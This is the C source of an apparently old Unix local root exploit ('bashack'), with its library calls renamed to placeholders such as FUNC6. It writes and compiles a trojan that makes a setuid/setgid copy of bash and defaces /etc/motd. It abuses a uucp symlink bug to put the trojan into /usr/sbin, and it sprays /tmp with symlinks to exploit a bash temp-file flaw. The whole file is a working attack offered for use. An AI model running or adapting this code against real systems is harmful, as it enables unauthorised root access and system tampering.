#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 char* FNAME ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC2 (char*,char*) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ *,char*,...) ; 
 char* FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 

FUNC11()
{
 int d;
  char fn[2000];
  char *homedir;
  FILE *file;
  FUNC6("bashack - root using multiple config/input validation errors\n\n");
  FUNC6("creating trojan in /usr/sbin/uuconv\n");
  FUNC6("                 - uucp bug -\n");
  FUNC6("uucp follows symlinks as euid=uucp, (uid,gid,egid=you)\n\n");
  homedir=FUNC4("HOME");
  FUNC7(fn,"%s/bashacker/",homedir);
  FUNC5(fn);
  FUNC0(fn);
  FUNC7(fn,"%s/bashacker/bashaker",homedir);
  FUNC10(fn);
  FUNC6("== uuconv replacement\n");
  FUNC6("* making uuconv.c\n");
  FUNC7(fn,"%s/bashacker/uuconv.c",homedir);
  file=FUNC2(fn,"w");
  FUNC7(fn,"%s/bashacker",homedir);
  FUNC3(file,"main()\n{\n");
  FUNC3(file,"printf(\"sendmail\n\");\n");
  FUNC3(file,"system(\"/bin/cp /bin/bash %s/bashacker;",fn);
  FUNC3(file,"/bin/chmod 6711 %s/bashacker;",fn);
  FUNC3(file,"echo hacked by %s>>/etc/motd;",FUNC4("LOGNAME"));
  FUNC3(file,"echo -n \\\"at about \\\" >>/etc/motd; /bin/date >>/etc/motd");
  FUNC3(file,"\");\n");
  FUNC3(file,"}\n");
  FUNC1(file);
  FUNC6("* compiling ./uuconv.c ==> ./uuconv \n");
  FUNC9("cc -o uuconv uuconv.c -O2;strip uuconv");
  FUNC10("/var/spool/uucppublic/uuconv"); 
  FUNC8("/usr/sbin/uuconv","/var/spool/uucppublic/uuconv");
  FUNC6("* copying to /usr/sbin via uucp bug\n");
  FUNC7(fn,
  "/usr/bin/uucp %s/bashacker/uuconv /var/spool/uucppublic/uuconv",homedir);
  FUNC9(fn);
  FUNC6("== cleaning up a little.\n");
  FUNC10("/var/spool/uucppublic/uuconv");
  FUNC10("uuconv");
  FUNC10("uuconv.c");
  FUNC6("== set up /tmp for bash part of exploit.\n");
  for(d=100;d<150;d++)
  /*
   on my machine its something like 118-120 or something, but it does
   depend on what was running, or what files existed and stuff.
   so please excuse the shotgun approach.
  */
  {
  FUNC7(fn,"/tmp/t%d-sh",d);
  FUNC10(fn);
  FUNC8(FNAME,fn);
  } 
  FUNC6("* my work here is done.\n\n");
  FUNC6("now pray for some kinda of crash.\n\n\t--zen\n");
}